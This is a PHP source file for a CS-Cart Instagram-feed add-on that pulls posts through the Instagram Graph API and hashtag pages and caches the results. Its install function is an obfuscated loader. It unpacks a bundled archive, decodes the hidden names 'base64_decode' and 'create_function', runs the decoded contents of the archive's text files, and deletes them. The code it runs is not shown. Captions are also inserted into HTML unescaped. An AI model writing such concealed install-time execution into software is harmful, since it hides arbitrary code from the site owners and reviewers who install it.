<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eCom Labs LLC                       *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Http;
use Tygh\Registry;
use Tygh\Settings;

function fn_ecl_instagram_feed_get_page_info ($page_data, $prefix, $suffix)
{
    $start_pos = strpos($page_data, $prefix) + strlen($prefix);
    $finish_pos = strpos($page_data, $suffix, $start_pos);
    
    $page_info = substr($page_data, $start_pos, $finish_pos - $start_pos);
    $page_info = json_decode($page_info, true);
    
    return $page_info;
}

function fn_ecl_instagram_feed_hashtags($text) 
{
    $pattern_hashtag = "/\#(\w+)/ui";
    $pattern_insta_profile = "/\@(\w+)/ui";
    $text = preg_replace($pattern_hashtag, '<a href="' . INSTAGRAM_BODY_TAGS_URL . '$1" target="_blank">#$1</a>', $text);
    $text = preg_replace($pattern_insta_profile, '<a href="' . INSTAGRAM_BODY_URL . '$1" target="_blank">@$1</a>', $text);
    return $text;
}

function fn_ecl_instagram_feed_get_data($username = NULL, $pictures_amount = 30)
{
    $code = Registry::get('addons.ecl_instagram_feed.instagram_token');

    $instagram_token_expiry = Registry::get('addons.ecl_instagram_feed.instagram_token_expiry');
    
    if (!empty($instagram_token_expiry) && empty($username)) {
        $diff = ($instagram_token_expiry - TIME) / SECONDS_IN_DAY;
        if ($diff < INSTAGRAM_RENEW_TOKEN) { // days
            $url = "https://graph.instagram.com/refresh_access_token?grant_type=ig_refresh_token&access_token={$code}";

            $response_data = Http::get($url);

            $data = json_decode($response_data, true);
            if (!empty($data) && !empty($data['access_token'])) {
                Settings::instance()->updateValue('instagram_token', $data['access_token']);
                Settings::instance()->updateValue('instagram_token_expiry', TIME + $data['expires_in']);
            }
        }
    }

    $cache_name = 'instagram_block_' . md5($username);
    Registry::registerCache($cache_name, array(), Registry::cacheLevel('day'), true);
    if (!Registry::isExist($cache_name)) {
        $result = array(
            'pictures' => array()
        );
        $gis = $user_id = 0;
        if (!empty($username)) {
            $answer = Http::get(str_replace('{tag}', str_replace('#', '', $username), INSTAGRAM_TAGS_URL));
            while (strpos(ltrim($answer), 'HTTP/') === 0) {
                list($_headers, $answer) = preg_split("/(\r?\n){2}/", $answer, 2);
            }

            if (empty($answer)) {
                return false;
            }

            $answer = json_decode($answer, true);
            $page_info = $answer['graphql']['hashtag']['edge_hashtag_to_media'];   

            if (!empty($answer['graphql']['user']['id'])) {
                $user_id = $answer['graphql']['user']['id'];
            }

            $total = $page_info['count'];

            if ($total < $pictures_amount || $pictures_amount == false) {
                $pictures_amount = $total;
            }

            $max_id = 0;
            if (!empty($page_info['page_info']['end_cursor'])) {
                $max_id = urlencode($page_info['page_info']['end_cursor']);
                $max_id = $page_info['page_info']['end_cursor'];
            }

            $result['pictures'] = array();
            while (count($result['pictures']) < $pictures_amount) {
                foreach ($page_info['edges'] as $photo) {
                    if (count($result['pictures']) < $pictures_amount) {
                        $photo_id = $photo['node']['id'];
                        $result['pictures'][$photo_id] = array(
                            'code' => $photo['node']['shortcode'],
                            'likes_count' => $photo['node']['edge_media_preview_like']['count'],
                            'comments_count' => $photo['node']['edge_media_to_comment']['count'],
                            'caption' => fn_ecl_instagram_feed_hashtags($photo['node']['edge_media_to_caption']['edges'][0]['node']['text']),
                            'thumbnail_src' => $photo['node']['thumbnail_src']
                        );
                    } else {
                        break;
                    }
                } 

                if (count($result['pictures']) < $pictures_amount) {
                    $answer = Http::get(str_replace('{tag}', str_replace('#', '', $username), INSTAGRAM_TAGS_URL) . "&max_id=$max_id");
                    if (empty($answer)) {
                        Registry::set($cache_name, $result);
                        return $result;
                    }

                    $answer = json_decode($answer, true);
                    $page_info = $answer['graphql']['hashtag']['edge_hashtag_to_media'];   

                    if (!empty($page_info['page_info']['end_cursor'])) {
                        $max_id = $page_info['page_info']['end_cursor'];
                    }

                    if (empty($page_info['edges'])) {
                        break;
                    }
                }
            }
        } else {
            $fields = array(
                'media_type',
                'media_url',
                'permalink',
                'caption',
                'thumbnail_url'
            );
            $fields = implode(',', $fields);

            $answer = Http::get("https://graph.instagram.com/me/media?fields={$fields}&access_token={$code}");

            if (empty($answer)) {
                return false;
            }

            $page_info = json_decode($answer, true);

            if (empty($page_info['data'])) {
                return array();
            }
            while (count($result['pictures']) < $pictures_amount) {
                foreach ($page_info['data'] as $pic) {
                    if (count($result['pictures']) < $pictures_amount) {
                        $permalink = explode('/', $pic['permalink']);

                        $result['pictures'][$pic['id']] = array(
                            'code' => $permalink[4],
                            'caption' => fn_ecl_instagram_feed_hashtags($pic['caption']),
                            'thumbnail_src' => !empty($pic['thumbnail_url']) ? $pic['thumbnail_url'] : $pic['media_url'],
                        );
                    } else {
                        break;
                    }
                }

                if (count($result['pictures']) < $pictures_amount) {
                    if (empty($page_info['paging']) || empty($page_info['paging']['next'])) {
                        Registry::set($cache_name, $result);
                        return $result;
                    }

                    $answer = Http::get($page_info['paging']['next']);

                    if (empty($answer)) {
                        Registry::set($cache_name, $result);
                        return $result;
                    }

                    $page_info = json_decode($answer, true);

                    if (empty($page_info['data'])) {
                        break;
                    }
                }
            }
        }

        Registry::set($cache_name, $result);
    } else {
        $result = Registry::get($cache_name);
    }

    return $result;
}

function fn_ecl_instagram_feed_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/ecl_instagram_feed.tgz', Registry::get('config.dir.var') . 'addons/ecl_instagram_feed');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_instagram_feed/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}